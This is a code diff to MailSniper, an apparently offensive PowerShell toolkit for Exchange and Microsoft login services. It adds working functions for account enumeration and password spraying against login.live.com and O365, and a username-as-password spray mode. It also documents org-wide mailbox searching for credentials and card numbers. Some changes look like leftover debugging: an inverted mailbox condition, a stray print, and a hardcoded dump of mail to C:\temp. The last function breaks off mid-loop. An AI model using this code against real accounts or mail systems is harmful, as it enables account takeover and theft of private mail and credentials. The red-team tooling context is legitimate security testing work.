@@ -1,120 +1,69 @@
 function Invoke-GlobalMailSearch{
 <#
   .SYNOPSIS
-
     This module will connect to a Microsoft Exchange server and grant the "ApplicationImpersonation" role to a specified user. Having the "ApplicationImpersonation" role allows that user to search through other domain user's mailboxes. After this role has been granted the Invoke-GlobalSearchFunction creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.
-
     MailSniper Function: Invoke-GlobalMailSearch
     Author: Beau Bullock (@dafthack)
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
-
   .DESCRIPTION
-
     This module will connect to a Microsoft Exchange server and grant the "ApplicationImpersonation" role to a specified user. Having the "ApplicationImpersonation" role allows that user to search through other domain user's mailboxes. After this role has been granted the Invoke-GlobalMailSearch function creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.
-
   .PARAMETER ImpersonationAccount
-
     Username of the current user account the PowerShell process is running as. This user will be granted the ApplicationImpersonation role on Exchange.
-
   .PARAMETER ExchHostname
-
     The hostname of the Exchange server to connect to.
-
   .PARAMETER AdminUserName
-
     The username of an Exchange administrator (i.e. member of "Exchange Organization Administrators" or "Organization Management" group) including the domain (i.e. domain\adminusername).
-
   .PARAMETER AdminPassword
-
     The Password to the Exchange administrator (i.e. member of "Exchange Organization Administrators" or "Organization Management" group) account specified with AdminUserName.
-
   .PARAMETER AutoDiscoverEmail
-
     A valid email address that will be used to autodiscover where the Exchange server is located.
-
   .PARAMETER MailsPerUser
-
     The total number of emails to return for each mailbox.
-
   .PARAMETER Terms
-
     Certain terms to search through each email subject and body for. By default the script looks for "*password*","*creds*","*credentials*"
-
   .PARAMETER OutputCsv
-
     Outputs the results of the search to a CSV file.
-
   .PARAMETER ExchangeVersion
-
     In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
-
   .PARAMETER EmailList
-
     A text file listing email addresses to search (one per line).
-
   .PARAMETER Folder
-
     The folder of each mailbox to search. By default the script only searches the "Inbox" folder. By specifying 'all' for the Folder option all of the folders including subfolders of the specified mailbox will be searched.
-
   .PARAMETER Regex
-
     The regex parameter allows for the use of regular expressions when doing searches. This will override the -Terms flag. 
-
   .PARAMETER CheckAttachments
-
     If the CheckAttachments option is added MailSniper will attempt to search through the contents of email attachements in addition to the default body/subject. These attachments can be downloaded by specifying the -DownloadDir option. It only searches attachments that are of extension .txt, .htm, .pdf, .ps1, .doc, .xls, .bat, and .msg currently.
-
   .PARAMETER DownloadDir
-
     When the CheckAttachments option finds attachments that are matches to the search terms the files can be downloaded to a specific location using the -DownloadDir option. 
-
-
   .EXAMPLE
-
     C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -OutputCsv global-email-search.csv
-
     Description
     -----------
     This command will connect to the Exchange server located at 'Exch01' and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as "current-username" where by default 100 of the latest emails from each mailbox will be searched through for the terms "*pass*","*creds*","*credentials*" and output to a CSV called global-email-search.csv.
-
   .EXAMPLE
-
     C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail user@domain.com -MailsPerUser 2000 -Terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*"
-
     Description
     -----------
     This command will connect to the Exchange server autodiscovered from the email address entered, and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as "current-username" where 2000 of the latest emails from each mailbox will be searched through for the terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*".
-
   .EXAMPLE
-
     C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -AdminUserName domain\exchangeadminuser -AdminPassword Summer123 -ExchangeVersion Exchange2010 -OutputCsv global-email-search.csv
-
     Description
     -----------
     This command will connect to the Exchange server located at 'Exch01' and use the Exchange admin username and password specified in the command line. A PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services using an Exchange Version of Exchange2010 as "current-username" where by default 100 of the latest emails from each mailbox will be searched through for the terms "*pass*","*creds*","*credentials*" and output to a CSV called global-email-search.csv.
-
   .EXAMPLE
-
     C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail user@domain.com -Folder all
-
     Description
     -----------
     This command will connect to the Exchange server autodiscovered from the email address entered, and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as "current-username" where 100 of the latest emails from each folder including subfolders in each mailbox will be searched through for the terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*".
-
   .EXAMPLE
-
     C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail current-user@domain.com -Regex '.*3[47][0-9]{13}.*|.*(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}.*|.*4[0-9]{12}(?:[0-9]{3}).*'
-
     Description
     -----------
     This command will utilize a Regex search instead of the standard Terms functionality. Specifically, the regular expression in the example above will attempt to match on valid VISA, Mastercard, and American Express credit card numbers in the body and subject's of emails.
-
   .EXAMPLE
-
     C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail current-user@domain.com -CheckAttachments -DownloadDir C:\temp
-
     Description
     -----------
     This command will search through all of the attachments to emails as well as the default body/subject for specific terms and download any attachments found to the C:\temp directory.
@@ -759,15 +708,35 @@ function Invoke-SelfSearch{
   else
   {
     ("[*] Autodiscovering email server for " + $Mailbox + "...")
-    $service.AutoDiscoverUrl($Mailbox, {$true})
+    try
+    {
+      $service.AutoDiscoverUrl($Mailbox, {$true})
+    }
+    catch [System.Management.Automation.MethodInvocationException]
+    {
+      $e = $_.Exception.InnerException
+      if ($e.GetType().Name -eq "AutodiscoverRemoteException")
+      {
+        [Microsoft.Exchange.WebServices.autodiscover.AutodiscoverRemoteException]$e = $e
+        # AutodiscoverRemoteException has an Error property which describes the error returned by the AutoDiscover service
+        # https://msdn.microsoft.com/en-us/library/microsoft.exchange.webservices.autodiscover.autodiscoverremoteexception.error%28v=exchg.80%29.aspx?f=255&MSPPError=-2147217396
+        Write-Output ("[!] AutodiscoverRemoteException: '" + $e.Error.Message + "'")
+        break
+      }
+      # Unfortunately, the other exception case, AutodiscoverLocalException does not have the Error property
+      # Therefore we do not have any interesting info to display
+    }
+
   }    
 
-    if($OtherUserMailbox)
+    if(!($OtherUserMailbox))
     {
+        Write-Host "other usser"
         $msgfolderroot = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$Mailbox)
         $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$msgfolderroot)
         $ItemView = New-Object Microsoft.Exchange.WebServices.Data.ItemView(1)
-        $Item = $service.FindItems($Inbox.Id,$ItemView)  
+        $Item = $service.FindItems($Inbox.Id,$ItemView) 
+        $item 
 
     }
     else
@@ -791,7 +760,7 @@ function Invoke-SelfSearch{
 
     $PostSearchList = @() 
     
-    if($OtherUserMailbox)
+    if(!($OtherUserMailbox))
     {
          
       $PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
@@ -829,6 +798,7 @@ function Invoke-SelfSearch{
         {
           foreach($regularexpresion in $Regex)
           {
+          $item.Body.Text
             if ($item.Body.Text -match $regularexpresion)
             {
             $PostSearchList += $item
@@ -1060,7 +1030,8 @@ function Invoke-SelfSearch{
     }
    } 
 
-  $PostSearchList | ft -Property Sender,ReceivedBy,Subject,Body
+  $PostSearchList | out-string -Width 4096 > C:\temp\mails3.txt
+  $PostSearchList | out-string -Width 4096 | ft -Property Subject,Body
   if ($OutputCsv -ne "")
   { 
     $PostSearchList | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace ",",'&#44;'}
@@ -1209,7 +1180,24 @@ function Get-MailboxFolders{
   else
   {
     ("[*] Autodiscovering email server for " + $Mailbox + "...")
-    $service.AutoDiscoverUrl($Mailbox, {$true})
+       try
+    {
+      $service.AutoDiscoverUrl($Mailbox, {$true})
+    }
+    catch [System.Management.Automation.MethodInvocationException]
+    {
+      $e = $_.Exception.InnerException
+      if ($e.GetType().Name -eq "AutodiscoverRemoteException")
+      {
+        [Microsoft.Exchange.WebServices.autodiscover.AutodiscoverRemoteException]$e = $e
+        # AutodiscoverRemoteException has an Error property which describes the error returned by the AutoDiscover service
+        # https://msdn.microsoft.com/en-us/library/microsoft.exchange.webservices.autodiscover.autodiscoverremoteexception.error%28v=exchg.80%29.aspx?f=255&MSPPError=-2147217396
+        Write-Output ("[!] AutodiscoverRemoteException: '" + $e.Error.Message + "'")
+        break
+      }
+      # Unfortunately, the other exception case, AutodiscoverLocalException does not have the Error property
+      # Therefore we do not have any interesting info to display
+    }
   }    
 
     Write-Output ("[*] Now searching mailbox: $Mailbox for folders.")
@@ -1835,7 +1823,10 @@ function Invoke-PasswordSprayEWS{
 
     [Parameter(Position = 6, Mandatory = $False)]
     [string]
-    $Domain = ""
+    $Domain = "",
+    
+    [switch]
+    $usernameaspassword
 
   )
     Write-Host -ForegroundColor "yellow" "[*] Now spraying the EWS portal at https://$ExchHostname/EWS/Exchange.asmx"
@@ -1848,14 +1839,17 @@ function Invoke-PasswordSprayEWS{
     $userlists = @{}
     $count = 0 
     $Usernames |% {$userlists[$count % $Threads] += @($_);$count++}
-    $userPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
+    if (!($usernameaspass))
+    {
+        $userPassword = $Password | ConvertTo-SecureString -AsPlainText -Force
+    }
             
     Write-Output "[*] Trying Exchange version $ExchangeVersion"
     $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
     $UncompressedFileBytes = New-Object Byte[](1092608)
     $DeflatedStream.Read($UncompressedFileBytes, 0, 1092608) | Out-Null
     0..($Threads-1) |% {
-
+    
         Start-Job -ScriptBlock{
   #load the required Exchange Web Services dll
   #Exchange Web Services requires a specific DLL be loaded in order to perform calls against it. This DLL can typically be found on a system after installing EWS Managed API here: C:\Program Files (x86)\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll
@@ -1908,11 +1902,30 @@ function Invoke-PasswordSprayEWS{
             $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
             ForEach($UserName in $args[0])
             {
-                
-                $userPassword = $args[1]
+                $usernameaspass = $args[8]
+                if ($usernameaspass)
+                {
+                    $pass = $UserName
+                    $userPassword = $pass | ConvertTo-SecureString -AsPlainText -Force
+                    
+                }
+                else
+                {
+                    $userPassword = $args[1]
+                }
                 $ExchHostname = $args[2]
                 $Mailbox = $args[3]
-                $Password = $args[5]
+                
+                if ($usernameaspass)
+                {
+                    $pass = $UserName
+                    $Password = $pass | ConvertTo-SecureString -AsPlainText -Force
+                }
+                else
+                {
+                    $Password = $args[5]
+                }
+                
                 $Domain = $args[7]
 
                 if ($Domain -ne "")
@@ -1948,7 +1961,7 @@ function Invoke-PasswordSprayEWS{
    
 
             }
-        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes, $Domain | Out-Null
+        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes, $Domain, $usernameaspassword | Out-Null
     
     }
     $Complete = Get-Date
@@ -2199,10 +2212,10 @@ function Invoke-DomainHarvestOWA {
                 {
                 $wwwheader = $($headers[$headerkey]) -split ',|\s'
                 $base64decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($wwwheader[1]))
-                $commasep = $base64decoded -replace '[^\x21-\x39\x41-\x5A\x61-\x7A]+', ','
+                $commasep = $base64decoded -replace '[^\x21-\x39\x41-\x5A\x61-\x7A\x5F]+', ','
                 $ntlmresparray = @()
                 $ntlmresparray = $commasep -split ','
-                Write-Host ("The domain appears to be: " + $ntlmresparray[7])
+                Write-Host ("The domain appears to be: " + $ntlmresparray[4] + " or " +$ntlmresparray[7])
                 }
 
             }
@@ -2226,10 +2239,10 @@ function Invoke-DomainHarvestOWA {
                         {
                         $wwwheader = $($headers[$headerkey]) -split ',|\s'
                         $base64decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($wwwheader[1]))
-                        $commasep = $base64decoded -replace '[^\x21-\x39\x41-\x5A\x61-\x7A]+', ','
+                        $commasep = $base64decoded -replace '[^\x21-\x39\x41-\x5A\x61-\x7A\x5F]+', ','
                         $ntlmresparray = @()
                         $ntlmresparray = $commasep -split ','
-                        Write-Host ("The domain appears to be: " + $ntlmresparray[7])
+                        Write-Host ("The domain appears to be: " + $ntlmresparray[4] + " or " +$ntlmresparray[7])
                         }
 
                     }
@@ -3889,7 +3902,641 @@ Function Invoke-AddGmailRule{
             Write-Output "[*] Success! The rule has been added successfuly`n"
         }
 }
+function Invoke-UsernameHarvestMicrosoftLive {
+    <#
+    .SYNOPSIS
+    Enumerates user accounts that are within the MS Office portal.
 
+    .DESCRIPTION
+    Enumerates user accounts by querying login.live.com. The response returns
+    IfExistsResult, which translates to:
+        0 => User account exists
+        1 => User account does not exist.
+
+    Function: Invoke-UsernameHarvestMicrosoftLive
+    Author: Dwight Hohnstein (@djhohnstein)
+    License: MIT
+    Required Dependencies: PowerShell 3.0 or above.
+    Optional Dependencies: None
+
+    .PARAMETER EmailAddress
+    Determine if specified email address lives within Microsoft's domain.
+
+    .PARAMETER EmailList
+    List of emails to validate
+
+    .PARAMETER OutFile
+    Write list of successful emails to file.
+
+    .EXAMPLE
+    Determine if single account exists:
+
+    Invoke-UsernameHarvestMicrosoftLive -EmailAddress victim@example.com
+    .EXAMPLE
+    Enumerate a list of users and write results to outfile:
+
+    Invoke-UsernameHarvest -EmailList emails.txt | % { $_.Name } | Out-File valid_emails.txt
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position=0, Mandatory=$false)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position=1, Mandatory=$false)]
+        [string]
+        $EmailList = "",
+
+        [Parameter(Position=2, Mandatory=$false)]
+        [string]
+        $OutFile = ""
+    )
+
+    if ($EmailAddress -eq "" -and $EmailList -eq "")
+    {
+        Write-Output "[-] Require -EmailAddress or -EmailList parameter to be specified"
+        break
+    }
+
+    $tokens = Read-MsftLiveLoginTokens
+    $MSPOK = $tokens.MSPOK
+    $FlowToken = $tokens.FlowToken
+    Write-Verbose "Retrieved MSPOK Cookie: $MSPOK"
+    Write-Verbose "Retrieved flowToken: $FlowToken"
+    $baseRequest = [System.Net.WebRequest]::Create("https://login.live.com/GetCredentialType.srf")
+    $baseRequest.Headers.Add("Cookie", "MSPOK=$MSPOK;")
+    $baseRequest.Headers.Add("Content-type", "application/json; charset=UTF-8")
+    $baseRequest.Method = "POST"
+
+    $uri = "https://login.live.com/GetCredentialType.srf"
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Host", "login.live.com")
+    $headers.Add("Connection", "close")
+    $headers.Add("Origin", "https://login.live.com")
+    $headers.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36")
+    $headers.Add("Content-type", "application/json; charset=UTF-8")
+    $headers.Add("Accept", "application/json")
+    $headers.Add("Accept-Encoding", "gzip, deflate")
+    $headers.Add("Accept-Language", "en-US,en;q=0.9")
+    $headers.Add("Cookie", "MSPOK=$MSPOK;")
+
+    $FullResults = @()
+
+    if ($EmailList -ne "")
+    {
+        $Emails = Get-Content $EmailList
+    }
+    else
+    {
+        $Emails = $EmailAddress
+    }
+    Write-Verbose "Beginning email enumeration."
+    ForEach($Email in $Emails)
+    {
+        $post = "{`"username`":`"$Email`",`"uaid`":`"`",`"isOtherIdpSupported`":false,`"checkPhones`":false,`"isRemoteNGCSupported`":true,`"isCookieBannerShown`":false,`"isFidoSupported`":false,`"flowToken`":`"$FlowToken`"}"
+        $request = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $post
+        $results = $request.Content | ConvertFrom-JSON
+        if ($results.IfExistsResult -eq 0)
+        {
+            Write-Host -ForegroundColor "green" "[*] SUCCESS! $email has an MicrosoftLive Account."
+            $FullResults += $email
+        }
+    }
+    Write-Verbose "Enumeration complete."
+    if($OutFile -ne "")
+    {
+        Write-Verbose "Writing results to $OutFile"
+        $FullResults | Out-File -Encoding ascii -Append $OutFile
+    }
+}
+
+function Invoke-PasswordSprayMicrosoftLive {
+    <#
+    .SYNOPSIS
+    Given a list of valid MicrosoftLive accounts, spray one or
+    many passwords to verify their validity.
+
+    .DESCRIPTION
+    This module connects first to login.live.com to retrieve
+    the requisite login tokens, then cycles through a password
+    or list of passwords. Then, for each email given, it will
+    attempt to login with the given password(s).
+
+    Function: Invoke-PasswordSprayMicrosoftLive
+    Author: Dwight Hohnstein (@djhohnstein)
+    License: MIT
+    Required Dependencies: PowerShell 3.0 or above.
+    Optional Dependencies: None
+
+    .PARAMETER EmailAddress
+    An email address to attempt to login against.
+
+    .PARAMETER EmailList
+    A list of emails to test against, one per line.
+
+    .PARAMETER Password
+    Password to login with.
+
+    .PARAMETER PasswordList
+    List of passwords to try and login with.
+
+    .Parameter Threads
+    Number of threads to run. Default 5.
+
+    .PARAMETER OutFile
+
+    .EXAMPLE
+    A single login attempt:
+
+    Invoke-PasswordSprayMicrosoftLive -EmailAddress victim@example.com -Password Spring2018!
+
+    .EXAMPLE
+    Spray two passwords across several accounts and write results to file.
+
+    Invoke-PasswordsprayMicrosoftLive -EmailList ./emails.txt -PasswordList ./passwords.txt -Threads 3 -OutFile success.txt
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position=0, Mandatory=$False)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position=1, Mandatory=$False)]
+        [string]
+        $EmailList = "",
+
+        [Parameter(Position=2, Mandatory=$False)]
+        [string]
+        $Password = "",
+
+        [Parameter(Position=3, Mandatory=$False)]
+        [string]
+        $PasswordList = "",
+
+        [Parameter(Position=4, Mandatory=$False)]
+        [int]
+        $Threads = 5,
+
+        [Parameter(Position=5, Mandatory=$False)]
+        [string]
+        $OutFile = ""
+    )
+
+    if ($EmailAddress -eq "" -and $EmailList -eq "")
+    {
+        Write-Error "Invalid number of arguments given. Require -EmailAddress or -EmailList"
+    }
+    elseif ($Password -eq "" -and $PasswordList -eq "")
+    {
+        Write-Error "Invalid number of arguments given. Require -Password or -PasswordList"
+    }
+    else
+    {
+        # Passed a single password to test against
+        if ($Password)
+        {
+            $Passwords = $Password
+        }
+        # Password list is given
+        else
+        {
+            $Passwords = Get-Content $PasswordList
+        }
+        if ($EmailList)
+        {
+            $Emails = Get-Content $EmailList
+        }
+        else
+        {
+            $Emails = $EmailAddress
+        }
+        $tokens = Read-MsftLiveLoginTokens
+        # Rewrite of the Gmail Spray threading block
+        $EmailCount = $Emails.Count
+        $PasswordCount = $Passwords.Count
+        $UserList = @{}
+        $Sprayed = @()
+        $Count = 0
+        # Populate the Email/Password Lists
+        $Emails | % { $UserList[$Count % $Threads] += @($_); $Count++ }
+
+        $MSPOK = $tokens.MSPOK
+        $FlowToken = $tokens.FlowToken
+        $uri = "https://login.live.com/ppsecure/post.srf"
+        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+        $headers.Add("Host", "login.live.com")
+        $headers.Add("Connection", "close")
+        $headers.Add("Cache-Control", "max-age=0")
+        $headers.Add("Origin", "https://login.live.com")
+        $headers.Add("Upgrade-Insecure-Requests", "1")
+        $headers.Add("Content-Type", "application/x-www-form-urlencoded")
+        $headers.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36")
+        $headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
+        $headers.Add("Accept-Encoding", "gzip, deflate")
+        $headers.Add("Accept-Language", "en-US,en;q=0.9")
+        $headers.Add("Cookie", "MSPOK=$MSPOK;")
+
+        # Start spraying
+        ForEach($Password in $Passwords)
+        {
+            Write-Verbose "Beginning spray attack with password: $Password"
+            0..($Threads - 1) | % {
+                Start-Job -ScriptBlock {
+                    $Password = $args[1]
+                    $FlowToken = $args[-1]
+                    $uri = $args[2]
+                    $headers = $args[3]
+                    ForEach($Email in $args[0])
+                    {
+                        $PostData = "i13=0&login=$Email&loginfmt=$Email&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=$Password&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=$FlowToken&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=0&i18=__ConvergedLoginPaginatedStrings%7C1%2C__ConvergedLogin_PCore%7C1%2C&i19=26144"
+                        # Ugly try catch since 302 is a terminating error in Invoke-WebRequest
+                        try
+                        {
+                            $Request = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $PostData -MaximumRedirection 0
+                            if ($Request.StatusCode -ne 200)
+                            {
+                                Write-Host -ForegroundColor "red" "Unknown error code returned: " $Request.StatusCode
+                            }
+                        }
+                        catch
+                        {
+                            if ($Error[0].Exception.Response.StatusCode -eq "Found")
+                            {
+                                Write-Output "[*] SUCCESS! User: $Email Password: $Password"
+                            }
+                        }
+                    }
+                    # Build the request
+                } -ArgumentList $UserList[$_], $Password, $uri, $headers, $FlowToken | Out-Null
+            }
+            $Complete = Get-Date
+            $MaxWaitAtEnd = 10000
+            $SleepTimer = 200
+            $FullResults = @()
+            While($(Get-Job -State Running).Count -gt 0)
+            {
+                $RunningJobs = ""
+                ForEach($Job in $(Get-Job -State Running))
+                {
+                    $RunningJobs += ", $($Job.name)"
+                }
+                $RunningJobs = $RunningJobs.Substring(2)
+                Write-Progress -Activity "Spraying password $Password..." -Status "$($(Get-Job -State Running).Count) threads remaining" -PercentComplete ($(Get-Job -State Completed).Count / $(Get-Job).Count * 100)
+                if($(New-TimeSpan $Complete $(Get-Date)).TotalSeconds -ge $MaxWaitAtEnd)
+                {
+                    Write-Host -ForegroundColor "red" "Time expired. Killing remaining jobs..."
+                    Get-Job -State Running | Remove-Job -Force
+                }
+                else
+                {
+                    Start-Sleep -Milliseconds $SleepTimer
+                    ForEach($Job in Get-Job)
+                    {
+                        $JobOutput = Receive-Job $Job
+                        if ($JobOutput)
+                        {
+                            Write-Host -ForegroundColor "green" $JobOutput
+                            $FullResults += $JobOutput
+                        }
+                    }
+                }
+            }
+            Write-Verbose ("[*] A total of " + $FullResults.Count + " account(s) used password: $Password")
+            if ($OutFile -ne "")
+            {
+                Write-Verbose "Writing results to $OutFile"
+                $FullResults = $FullResults -Replace '\[\*\] SUCCESS! User:', ''
+                $FullResults = $FullResults -Replace " Password: ", ":"
+                $FullResults | Out-File -Encoding ascii -Append $OutFile
+            }
+        }
+        if ($OutFile -ne "")
+        {
+            Write-Output "Results have been written to $OutFile"
+        }
+    }
+}
+
+function Read-MsftLiveLoginTokens {
+    <#
+    .SYNOPSIS
+    Retrieve the necessary tokens to prime username enumeration
+    and password spraying.
+
+    .DESCRIPTION
+    This module retrieves the MSPOK cookie and PPFT flow token from
+    the login.live.com page. These two items are responsible for a
+    genuine login attempt. If these values cannot be retrieved, an
+    error is thrown. Otherwise, return a PSObject like:
+
+    {
+        MSPOK: "$MSPOK";
+        FlowToken: "$FlowToken";
+    }
+
+    Function: Read-MsftLiveLoginTokens
+    Author: Dwight Hohnstein (@djhohnstein)
+    License: MIT
+    Required Dependencies: PowerShell 3.0 or above.
+    Optional Dependencies: None
+
+    .EXAMPLE
+    $tokens = Read-MsftLiveLoginTokens
+
+    #>
+    $results = @{}
+    $request = [System.Net.WebRequest]::Create("https://login.live.com/login.srf")
+    $response = $request.GetResponse()
+    $cookieString = $response.GetResponseHeader("Set-Cookie")
+    $mspokIndex = $cookieString.IndexOf("MSPOK")
+    $semiColonIndex = $cookieString.IndexOf(";", $mspokIndex)
+    $MSPOK = $cookieString.Substring($mspokIndex, $semiColonIndex-$mspokIndex).Split("=")[1]
+    Write-Verbose "Retrieved MSPOK Cookie: $MSPOK"
+    # PPFT/flowToken Index retrieval
+    $stream = $response.GetResponseStream()
+    $streamReader = New-Object System.IO.StreamReader $stream
+    $htmlResp = $streamReader.ReadToEnd()
+    $ppftIndex = $htmlResp.IndexOf("name=`"PPFT`"")
+    $endInputIndex = $htmlResp.IndexOf("/>", $ppftIndex)
+    $valueIndex = $htmlResp.IndexOf("value=`"", $ppftIndex)
+    if ($valueIndex -gt $endInputIndex)
+    {
+        Write-Error "Could not retrieve value of PPFT token. This indicates that the HTML structure of the document has changed. Open an issue report on Github!"
+        return $results
+    }
+    else
+    {
+        $firstQuote = $valueIndex + 7
+        $endValue = $htmlResp.IndexOf("`"", $firstQuote)
+        $FlowToken = $htmlResp.Substring($firstQuote, $endValue - $firstQuote)
+        Write-Verbose "Retrieved FlowToken: $FlowToken"
+        $results.MSPOK = $MSPOK
+        $results.FlowToken = $FlowToken
+        return $results
+    }
+}
+
+function Invoke-PasswordSprayO365 {
+  <#
+  .SYNOPSIS
+  Given a list of valid O365 accounts, spray one or
+  many passwords to verify their validity.
+
+  .DESCRIPTION
+  This module connects first to login.live.com to retrieve
+  the requisite login tokens, then cycles through a password
+  or list of passwords. Then, for each email given, it will
+  attempt to login with the given password(s).
+
+  Function: Invoke-PasswordSprayO365
+  Author: Dwight Hohnstein (@djhohnstein)
+  License: MIT
+  Required Dependencies: PowerShell 3.0 or above.
+  Optional Dependencies: None
+
+  .PARAMETER EmailAddress
+  An email address to attempt to login against.
+
+  .PARAMETER EmailList
+  A list of emails to test against, one per line.
+
+  .PARAMETER Password
+  Password to login with.
+
+  .PARAMETER PasswordList
+  List of passwords to try and login with.
+
+  .Parameter Threads
+  Number of threads to run. Default 5.
+
+  .PARAMETER OutFile
+
+  .EXAMPLE
+  A single login attempt:
+
+  Invoke-PasswordSprayO365 -EmailAddress victim@example.com -Password Spring2018!
+
+  .EXAMPLE
+  Spray two passwords across several accounts and write results to file.
+
+  Invoke-PasswordsprayO365 -EmailList ./emails.txt -PasswordList ./passwords.txt -Threads 3 -OutFile success.txt
+  #>
+  [CmdletBinding()]
+  Param(
+      [Parameter(Position=0, Mandatory=$False)]
+      [string]
+      $EmailAddress = "",
+
+      [Parameter(Position=1, Mandatory=$False)]
+      [string]
+      $EmailList = "",
+
+      [Parameter(Position=2, Mandatory=$False)]
+      [string]
+      $Password = "",
+
+      [Parameter(Position=3, Mandatory=$False)]
+      [string]
+      $PasswordList = "",
+
+      [Parameter(Position=4, Mandatory=$False)]
+      [int]
+      $Threads = 5,
+
+      [Parameter(Position=5, Mandatory=$False)]
+      [string]
+      $OutFile = ""
+  )
+
+  if ($EmailAddress -eq "" -and $EmailList -eq "")
+  {
+      Write-Error "Invalid number of arguments given. Require -EmailAddress or -EmailList"
+  }
+  elseif ($Password -eq "" -and $PasswordList -eq "")
+  {
+      Write-Error "Invalid number of arguments given. Require -Password or -PasswordList"
+  }
+  else
+  {
+      # Passed a single password to test against
+      if ($Password)
+      {
+          $Passwords = $Password
+      }
+      # Password list is given
+      else
+      {
+          $Passwords = Get-Content $PasswordList
+      }
+      if ($EmailList)
+      {
+          $Emails = Get-Content $EmailList
+      }
+      else
+      {
+          $Emails = $EmailAddress
+      }
+      $EmailCount = $Emails.Count
+      $PasswordCount = $Passwords.Count
+      $UserList = @{}
+      $Sprayed = @()
+      $Count = 0
+      # Populate the Email/Password Lists
+      $Emails | % { $UserList[$Count % $Threads] += @($_); $Count++ }
+
+      $MSPOK = $tokens.MSPOK
+      $FlowToken = $tokens.FlowToken
+      $Uri = "https://login.microsoftonline.com/common/login"
+
+      # Start spraying
+      ForEach($Password in $Passwords)
+      {
+          Write-Verbose "Beginning spray attack with password: $Password"
+
+          0..($Threads - 1) | % {
+              # Initialize tokens for each thread
+              $Tokens = Read-MsftOfficeLoginTokens
+              $Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+              $Headers.Add("Referer", $Tokens.Referer)
+              Start-Job -ScriptBlock {
+                  $Password = $args[1]
+                  $Tokens = $args[-1]
+                  $Uri = $args[2]
+                  $Headers = $args[3]
+                  $Ctx = $Tokens.Ctx
+                  $FlowToken = $Tokens.FlowToken
+                  ForEach($Email in $args[0])
+                  {
